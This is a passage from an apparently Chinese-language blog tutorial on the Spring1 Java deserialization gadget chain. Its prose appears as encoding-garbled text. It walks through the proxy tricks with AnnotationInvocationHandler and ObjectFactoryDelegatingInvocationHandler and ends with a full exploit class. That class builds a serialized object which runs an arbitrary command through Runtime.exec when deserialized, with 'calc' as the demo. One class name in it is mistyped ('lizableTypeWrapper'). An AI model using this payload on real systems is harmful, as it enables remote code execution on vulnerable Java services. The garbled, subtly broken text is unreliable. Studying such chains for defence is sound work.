class="built_in">this</span>.methodName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é‡æ–°åœ¨ç›®æ ‡å¯¹è±¡ï¼ˆprovider.getType()ï¼‰ä¸Šè°ƒç”¨è¯¥æ–¹æ³•ï¼Œæ¢å¤æ´¾ç”Ÿå­—æ®µ result</span></span><br><span class="line">        <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code> çš„ <code>readObject</code> ä¼šè°ƒç”¨ <code>this.provider.getType()</code> è¿”å›å¯¹è±¡çš„ <code>this.methodName</code> æŒ‡å®šçš„æ— å‚æ–¹æ³•ã€‚</p>
<p>è€Œ <code>provider</code> ä½œä¸º <code>org.springframework.core.SerializableTypeWrapper$TypeProvider</code> æ¥å£çš„å®ç°ç±»ï¼Œ<code>getType</code> æ–¹æ³•è¿”å›çš„å¯¹è±¡ç±»å‹æ˜¯ <code>java.lang.reflect.Type</code> æ¥å£çš„å®ç°ç±»ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">interface</span> <span class="title class_">TypeProvider</span> <span class="keyword">extends</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return the (possibly non &#123;<span class="doctag">@link</span> Serializable&#125;) &#123;<span class="doctag">@link</span> Type&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Type <span class="title function_">getType</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return the source of the type or &#123;<span class="doctag">@code</span> null&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Object <span class="title function_">getSource</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ï¼š</p>
<ul>
<li>è®© <code>this.MethodName</code> ä¸º <code>newTransformer</code> æˆ– <code>getOutputProperties</code>ï¼ˆè¿™ä¸¤ä¸ªéƒ½æ˜¯ <code>public</code> æ–¹æ³•ï¼Œ<code>findMethod</code> å’Œ <code>invokeMethod</code> éƒ½æ²¡æœ‰è®¾ç½® <code>Method</code> çš„å¯è®¿é—®æ€§ï¼‰ï¼›</li>
<li>è®©<code>this.provider.getType()</code> è¿”å› <code>TemplatesImpl</code>ã€‚</li>
</ul>
<p>è¿™ä¸ªå¯ä»¥é€šè¿‡<strong>åŠ¨æ€ä»£ç†</strong>å®ç°ã€‚</p>
<p><code>sun.reflect.annotation.AnnotationInvocationHandler</code> çš„ <code>invoke</code> æ–¹æ³•ä¼šæ ¹æ®æ–¹æ³•åä» <code>memberValues</code> ä¸­æŸ¥è¯¢å¯¹åº”çš„å¯¹è±¡è¿”å›ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> toStringImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>AnnotationInvocationHandler</code> ä»£ç†æ¥å£å®ç°ä»»æ„å¯¹è±¡è¿”å›ã€‚</p>
<p>ç„¶è€Œæˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥é€šè¿‡ <code>AnnotationInvocationHandler</code> ä»£ç† <code>TypeProvider</code> æ¥å£å¹¶è®¾ç½® <code>getType</code> æ–¹æ³•è¿”å› <code>TemplatesImpl</code>ã€‚</p>
<p>è¿™æ˜¯å› ä¸º JDK çš„ <code>Proxy</code> ä¼šä¸ºæ¥å£æ–¹æ³•ç”Ÿæˆç±»ä¼¼è¿™æ ·çš„æ¡©ä»£ç ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Type <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (Type) h.invoke(<span class="built_in">this</span>, m_getType, <span class="literal">null</span>);  <span class="comment">// æ³¨æ„è¿™é‡Œçš„å¼ºè½¬</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>æ— è®ºä½ çš„ InvocationHandler è¿”å›ä»€ä¹ˆ</strong>ï¼Œè¿™é‡Œéƒ½ä¼šè¢«å¼ºåˆ¶è½¬æˆ <code>Type</code>ã€‚<br><code>TemplatesImpl</code> å¹¶ä¸å®ç° <code>java.lang.reflect.Type</code>ï¼Œå› æ­¤ä¼šç«‹åˆ»æŠ›ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassCastException:</span><br><span class="line">  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">  cannot be cast to java.lang.reflect.Type</span><br></pre></td></tr></table></figure></div>

<p>ä¸ºæ­¤æˆ‘ä»¬éœ€è¦è®© <code>AnnotationInvocationHandler</code> ä»£ç†çš„åŠ¨æ€ä»£ç†åœ¨è°ƒç”¨åˆ° <code>getType</code> æ–¹æ³•æ—¶å†è¿”å›ä¸€ä¸ªåŠ¨æ€ä»£ç†ï¼Œç„¶åè¯¥åŠ¨æ€ä»£ç†å®ç° <code>Type</code> æ¥å£å¹¶ä¸”ç”± <code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code> ä»£ç†ã€‚</p>
<p><code>ObjectFactoryDelegatingInvocationHandler</code> çš„ <code>invoke</code> æ–¹æ³•ä¼šæŠŠæ–¹æ³•è°ƒç”¨å§”æ´¾ç»™ <code>objectFactory#getObject()</code> è·å–åˆ°çš„å¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦è®© <code>ObjectFactory#getObject</code> è¿”å› <code>TemplatesImpl</code> å³å¯ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ObjectFactoryDelegatingInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ObjectFactory&lt;?&gt; objectFactory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ObjectFactoryDelegatingInvocationHandler</span><span class="params">(ObjectFactory&lt;?&gt; objectFactory)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.objectFactory = objectFactory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// Only consider equal when proxies are identical.</span></span><br><span class="line">            <span class="keyword">return</span> (proxy == args[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// Use hashCode of proxy.</span></span><br><span class="line">            <span class="keyword">return</span> System.identityHashCode(proxy);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.objectFactory.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.objectFactory.getObject(), args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex.getTargetException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¸ºæ­¤æˆ‘ä»¬éœ€è¦å°† <code>objectFactory</code> ç»§ç»­å¥—ä¸€å±‚åŠ¨æ€ä»£ç†ï¼Œä»£ç† <code>ObjectFactory&lt;?&gt;</code> æ³›å‹æ¥å£ï¼Œåˆ©ç”¨ <code>AnnotationInvocationHandler</code> è¿”å› <code>TemplatesImpl</code>ã€‚</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>å¦ä¸€ç§æ€è·¯æ˜¯å¯»æ‰¾ <code>ObjectFactory</code> çš„å®ç°ç±»æ»¡è¶³ï¼š</p>
<ul>
<li>å®ç° <code>Serializable</code> æ¥å£ï¼›</li>
<li>ååºåˆ—åŒ–åçš„å¯¹è±¡çš„ <code>getObject</code> è¿”å›å€¼å¯æ§ã€‚</li>
</ul>
<p>ç„¶è€Œå®é™…ä¸Šå¯¹äº <code>ObjectFactory</code> è¿™ä¸ªæ¥å£æ¥è¯´æš‚æ—¶æ²¡æœ‰å‘ç°æ»¡è¶³ä¸Šè¿°æ¡ä»¶çš„å®ç°ç±»ï¼Œå› æ­¤é‡‡ç”¨äº†ä»£ç†è¿™ç§æ›´åŠ å¤æ‚çš„å®ç°æ–¹å¼ã€‚</p>
<p>è€Œåç»­çš„ Spring2 åˆ©ç”¨é“¾åˆ™æ˜¯å¯»æ‰¾äº† <code>ObjectFactoryDelegatingInvocationHandler</code> çš„æ›¿ä»£å“ <code>JdkDynamicAopProxy</code>ã€‚è¿™ä¸ªç±»çš„ <code>invoke</code> æ–¹æ³•å°†æ–¹æ³•è°ƒç”¨è½¬å‘åˆ° <code>SingletonTargetSource</code> å¯¹è±¡çš„ <code>getTarget</code> æ–¹æ³•è¿”å›çš„å¯¹è±¡ä¸Šã€‚ç”±äºè¿™é‡Œè¿”å›çš„å¯¹è±¡å¯æ§ï¼Œå› æ­¤å¯ä»¥ç¼©çŸ­ååºåˆ—åŒ–é“¾ã€‚</p>

    </div>
  </div>

<h4 id="åˆ©ç”¨ä»£ç -7"><a href="#åˆ©ç”¨ä»£ç -7" class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h4><p>é«˜ç‰ˆæœ¬ JDK çš„ <code>AnnotationInvocationHandler</code> ååºåˆ—åŒ–é€»è¾‘å˜äº†ï¼Œå¯¼è‡´è¯¥åˆ©ç”¨é“¾å¤±æ•ˆï¼ˆæš‚æœªæ·±ç©¶ï¼‰ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spring1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">AIHClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AIHConstruct</span> <span class="operator">=</span> AIHClazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AIHConstruct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">OFDIHClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">OFDIHConstruct</span> <span class="operator">=</span> OFDIHClazz.getDeclaredConstructor(ObjectFactory.class);</span><br><span class="line">        OFDIHConstruct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¯¹äº getObject æ–¹æ³•è°ƒç”¨è¿”å› TemplatesImpl</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">getObjectMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        getObjectMap.put(<span class="string">&quot;getObject&quot;</span>, templates);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">getObjectHandler</span> <span class="operator">=</span> (InvocationHandler) AIHConstruct.newInstance(Target.class, getObjectMap);</span><br><span class="line">        <span class="type">ObjectFactory</span> <span class="variable">getObjectProxy</span> <span class="operator">=</span> (ObjectFactory) Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ObjectFactory.class&#125;,</span><br><span class="line">                getObjectHandler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ»¡è¶³ Type å’Œ Templates ç±»å‹è¦æ±‚ï¼Œä¸”åˆ©ç”¨ OFDIH å°†æ–¹æ³•è°ƒç”¨è½¬å‘ç»™ getObjectProxy.getObject() çš„è¿”å›å¯¹è±¡</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">typeHandler</span> <span class="operator">=</span> (InvocationHandler) OFDIHConstruct.newInstance(getObjectProxy);</span><br><span class="line">        <span class="type">Type</span> <span class="variable">typeProxy</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Type.class, Templates.class&#125;,</span><br><span class="line">                typeHandler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é’ˆå¯¹ getType æ–¹æ³•è°ƒç”¨è¿”å› typeProxy</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">getTypeMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        getTypeMap.put(<span class="string">&quot;getType&quot;</span>, typeProxy);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">typeProviderClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.core.lizableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">getTypeHandler</span> <span class="operator">=</span> (InvocationHandler) AIHConstruct.newInstance(Target.class, getTypeMap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getTypeProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;typeProviderClazz&#125;,</span><br><span class="line">                getTypeHandler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">MITPClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">MITPConstructor</span> <span class="operator">=</span> MITPClazz.getDeclaredConstructor(typeProviderClazz, Method.class, <span class="type">int</span>.class);</span><br><span class="line">        MITPConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">MITP</span> <span class="operator">=</span> MITPConstructor.newInstance(getTypeProxy, Object.class.getMethod(<span class="string">&quot;toString&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        setFieldValue(MITP, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> MITP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

